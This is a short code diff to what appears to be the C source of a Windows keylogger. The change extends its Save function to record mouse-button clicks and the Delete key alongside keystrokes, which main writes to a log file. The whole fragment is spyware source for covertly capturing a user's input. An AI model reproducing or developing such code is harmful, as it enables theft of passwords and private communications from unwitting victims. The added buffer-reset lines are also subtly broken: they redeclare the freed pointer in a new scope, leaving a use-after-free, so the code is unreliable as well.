@@ -97,6 +97,26 @@ void Save(int key, char* input)
     {
         strcat(input, "[RIGHT ARROW]");
     }
+
+    else if(key == VK_LBUTTON)
+    {
+        strcat(input, "[LMB]");
+    }
+
+    else if(key == VK_RBUTTON)
+    {
+        strcat(input, "[RMB]");
+    }
+
+    else if(key == VK_MBUTTON)
+    {
+        strcat(input, "[MMB]");
+    }
+
+    else if(key == VK_DELETE)
+    {
+        strcat(input, "[DEL]");
+    }
     /*
     Add more use cases for keyboard layouts
     */
@@ -132,7 +152,8 @@ int main()
                     fprintf(fp,"%s", input);
                     fclose(fp);
                     free(input);
-                    
+                    char* input = (char*)malloc(100*sizeof(char));
+                    input[0] = '\0';
 
                 }            
                 
